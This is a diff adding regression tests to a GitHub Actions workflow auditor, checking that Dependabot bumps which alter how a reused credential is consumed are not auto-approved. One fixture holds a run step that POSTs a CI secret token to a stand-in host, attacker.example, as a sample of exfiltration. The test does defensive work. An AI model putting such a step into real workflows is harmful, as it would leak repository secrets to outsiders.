@@ -325,6 +325,100 @@ jobs:
           SCAN_TOKEN: \${{ secrets.SCAN_TOKEN_B }}
 `;
 
+// SCAN_TOKEN's value is byte-identical in both sources below; only the
+// step's run: body differs. A candidate that keeps an already-reviewed
+// credential expression unchanged while rewriting what the step does with
+// that credential (here: a benign scan command vs. exfiltrating the token to
+// an external host) must not be auto-approved just because the compared
+// surface only ever recorded the fields that themselves contain a credential
+// expression.
+const REUSABLE_WORKFLOW_CREDENTIAL_STEP_BODY_BASIS_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps:
+      - run: echo scan
+        env:
+          SCAN_TOKEN: \${{ secrets.SCAN_TOKEN_A }}
+`;
+
+const REUSABLE_WORKFLOW_CREDENTIAL_STEP_BODY_CHANGED_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps:
+      - run: curl -X POST https://attacker.example -d "token=$SCAN_TOKEN"
+        env:
+          SCAN_TOKEN: \${{ secrets.SCAN_TOKEN_A }}
+`;
+
+// The credential-bearing gate must fire on every field family, not just
+// condition/env/with/credentialAction: this step's only credential
+// expression is inline in `run:`, with no env or with block at all. A gate
+// that omitted the remaining-step-body check would drop this step out of the
+// compared surface entirely, so a bump that swaps only the referenced secret
+// (A -> B) would leave every recorded surface field identical and be
+// auto-approved.
+const REUSABLE_WORKFLOW_CREDENTIAL_RUN_BODY_ONLY_BASIS_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps:
+      - run: deploy --token \${{ secrets.DEPLOY_TOKEN_A }}
+`;
+
+const REUSABLE_WORKFLOW_CREDENTIAL_RUN_BODY_ONLY_CHANGED_SOURCE = `name: osv-scanner
+on:
+  workflow_call:
+    inputs:
+      runner:
+        required: true
+        type: string
+    secrets:
+      token:
+        required: false
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: \${{ inputs.runner }}
+    steps:
+      - run: deploy --token \${{ secrets.DEPLOY_TOKEN_B }}
+`;
+
 // The reviewed basis already contains a localCredentialActions entry
 // (actions/create-github-app-token), pinned to one ref. The changed source
 // below pins the identical action to a different ref only -- the same
@@ -3037,6 +3131,79 @@ test("Dependabot SHA bump that changes only the exact secret referenced in a cal
     fetchImpl: fetchImplFor({
       [SHA]: REUSABLE_WORKFLOW_CREDENTIAL_REFERENCE_BASIS_SOURCE,
       [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_CHANGED_CREDENTIAL_REFERENCE_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: credentialReferences changed since the previously reviewed .*@${SHA}`,
+    ),
+  );
+});
+
+// Regression test for a gap where jobCredentialReferenceSurface recorded only
+// the fields of a credential-bearing step that themselves contained a
+// credential expression (condition/env/with, filtered through
+// credentialBearingEntries), never the rest of the step. A bumped SHA could
+// keep an already-reviewed step's env/with credential expression
+// byte-identical while rewriting the step's run: body -- e.g. from a benign
+// scan command to one that exfiltrates the same credential -- and the
+// filtered surface would stay unchanged, silently auto-approving unreviewed
+// executable code that consumes the credential differently.
+test("Dependabot SHA bump that changes only a credential-bearing step's run body is declined with a specific diagnostic", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_CREDENTIAL_STEP_BODY_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_CREDENTIAL_STEP_BODY_CHANGED_SOURCE,
+    }),
+  });
+  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
+  assert.ok(contractFinding);
+  assert.match(
+    contractFinding.message,
+    new RegExp(
+      `auto-approval declined: credentialReferences changed since the previously reviewed .*@${SHA}`,
+    ),
+  );
+});
+
+// Regression test proving the credential-bearing gate itself checks every
+// field family. This step's only credential expression is inline in `run:`,
+// with no env or with block, so it is invisible to a gate that only checks
+// condition/env/with/credentialAction; such a gate would drop the step out
+// of credentialReferences entirely, and a bump that swaps only the
+// referenced secret would leave every recorded surface field identical.
+test("Dependabot SHA bump that changes only the secret referenced inline in a credential-bearing step's run body is declined with a specific diagnostic", async () => {
+  const root = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    workflows: {
+      "ci.yml": `jobs:
+  scan:
+    uses: ${DEPENDABOT_BUMP_REFERENCE}
+    with:
+      runner: ubuntu-24.04
+`,
+    },
+  });
+  const findings = await audit(root, {
+    fetchImpl: fetchImplFor({
+      [SHA]: REUSABLE_WORKFLOW_CREDENTIAL_RUN_BODY_ONLY_BASIS_SOURCE,
+      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_CREDENTIAL_RUN_BODY_ONLY_CHANGED_SOURCE,
     }),
   });
   const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
